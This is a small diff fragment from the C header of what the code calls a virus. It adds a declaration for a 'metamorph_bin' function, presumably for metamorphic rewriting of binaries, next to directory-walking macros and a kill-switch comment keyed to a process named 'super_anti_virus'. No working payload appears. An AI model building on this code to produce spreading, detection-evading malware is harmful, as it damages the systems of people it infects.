@@ -30,6 +30,8 @@ typedef struct	s_exec_ctx
 #define _DOT(x) 	(!(*(x)^0x2e)&!*((x)+1))
 #define _DDOT(x)	(!(*(x)^0x2e)&!(*(x+1)^0x2e)&!*(x+2))
 
+int metamorph_bin(const char *path);
+
 // stops the virus if any process with this string in the name runs on the machine
 #define BLOCKING_PROCESS "super_anti_virus"
 
